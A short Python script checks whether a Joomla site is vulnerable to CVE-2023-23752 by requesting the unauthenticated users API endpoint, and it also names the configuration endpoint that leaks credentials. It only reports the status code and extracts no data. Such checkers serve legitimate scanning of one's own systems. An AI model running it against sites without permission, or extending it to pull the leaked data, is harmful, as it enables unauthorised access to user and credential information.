import requests
import sys

url = sys.argv[1].strip("/")
def main():
 endpoint_vuln = "/api/index.php/v1/users?public=true"
 password_endpoint_vuln = "/api/index.php/v1/config/application?public=true"
 r=requests.get(url+endpoint_vuln)
 if r.status_code == 200:
  print("This site has vulnerable CVE-2023-23752")
 else:
  print("this site has no vulnerable")
if __name__=="__main__":
 main()
